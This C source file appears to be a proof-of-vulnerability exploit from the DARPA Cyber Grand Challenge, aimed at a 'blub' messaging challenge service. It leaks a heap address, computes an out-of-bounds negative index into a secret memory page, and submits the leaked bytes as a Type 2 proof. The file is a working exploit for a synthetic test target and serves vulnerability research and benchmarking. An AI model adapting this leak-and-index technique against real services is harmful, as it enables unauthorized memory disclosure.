#include "libpov.h"

#ifndef DEBUG
  #include "cgc_xlat.h"
#endif

//-----

#ifndef DEBUG
  #define EOT_C '\x04'
  #define EOT_S "\x04"
#else
  #define EOT_C '\n'
  #define EOT_S "\n"
#endif
#define USERNAME_MAX 32
#define BLUB_MAX 140
#define QUIT_ID 0xdeadbeef

void cgc_sleep(uint32_t usec)
{
  struct cgc_timeval t;
  t.tv_sec = usec / 1000000;
  t.tv_usec = usec % 1000000;
  cgc_fdwait(1, NULL, NULL, &t, NULL);
}

static void *cgc_memmove(void *dst, const void *src, cgc_size_t n)
{
    unsigned char *udst = dst;
    const unsigned char *usrc = src;
    cgc_size_t i;

    if (dst > src)
    {
        for (i = 0; i < n; i++)
            udst[n - i - 1] = usrc[n - i - 1];
    }
    else
    {
        for (i = 0; i < n; i++)
            udst[i] = usrc[i];
    }

    return dst;
}

static void _convert_unsigned(char *buf, unsigned x, int base, int upper)
{
    const char *numbers;
    char *tmp = buf + 20;

    if (upper)
        numbers = "0123456789ABCDEF";
    else
        numbers = "0123456789abcdef";

    /* NUL terminate */
    *(--tmp) = 0;

    if (x == 0)
        *(--tmp) = numbers[0];
    else
    {
        while (x)
        {
            *(--tmp) = numbers[x % base];
            x = x / base;
        }
    }

    /* move to beginning of buf */
    cgc_memmove(buf, tmp, 20 - (buf - tmp));
}

static void _convert_signed(char *buf, int x, int base, int upper)
{
    if (x < 0)
    {
        *buf++ = '-';
        x = -x;
    }

    _convert_unsigned(buf, x, base, upper);
}

static void cgc_send_string(int fd, const char* s)
{
  cgc_transmit_all(fd, s, cgc_strlen(s));
}

static void cgc_strcat(char* s1, const char* s2)
{
  char* p = s1;
  while (*p != '\0') p++;
  cgc_strcpy(p, s2);
}

int main(int cgc_argc, char *cgc_argv[])
{

#ifndef DEBUG
  cgc_xlat_seed("9an538n9av3;5");
#endif

  char buf[1024];
  int secrets = 0x4347c010;
  const char* reg = "charlie" EOT_S;
  const char* sub_self = "s" EOT_S "charlie" EOT_S;
  const char* start_blub = "b" EOT_S;
  const char* read_blubs = "r" EOT_S;

  length_read(0, (unsigned char*)buf, 0x4);
#ifndef TESTING
  unsigned char data[4];
  type2_vals t2;
  cgc_type2_negotiate(&t2);
#endif

  cgc_send_string(1, reg);
  length_read(0, (unsigned char*)buf, 0x4);
  cgc_send_string(1, sub_self);
  cgc_send_string(1, start_blub);
  cgc_send_string(1, "adf");
  cgc_transmit_all(1, &secrets, sizeof(secrets));
  cgc_send_string(1, EOT_S);
  cgc_send_string(1, read_blubs);

  length_read(0, (unsigned char*)buf, 0x30);
  length_read(0, (unsigned char*)buf, 0x4);
#ifndef DEBUG
  cgc_size_t client_0_data = 0xb7e004f8;
#else
  cgc_size_t client_0_data = 0xb7e000b8;
#endif
  cgc_size_t secret_addr = (*(cgc_size_t*)buf) + 44;
  int diff = secret_addr - client_0_data;
  diff /= 4;
  int idx = (2 << 29) - diff;

  _convert_signed(buf, -idx, 10, 0);

  char tosend[1024];
  cgc_strcat(tosend, "y");
  cgc_strcat(tosend, EOT_S);
  cgc_strcat(tosend, "charlie");
  cgc_strcat(tosend, EOT_S);
  cgc_strcat(tosend, buf);
  cgc_strcat(tosend, EOT_S);
  cgc_send_string(1, tosend);
  cgc_send_string(1, read_blubs);
  const char* cgc_exit = "e" EOT_S;
  cgc_send_string(1, cgc_exit);

#ifndef TESTING
  length_read(0, (unsigned char*)buf, 336);
  length_read(0, data, 4);
  cgc_type2_submit(data, 4);
#endif

  return 0;
}
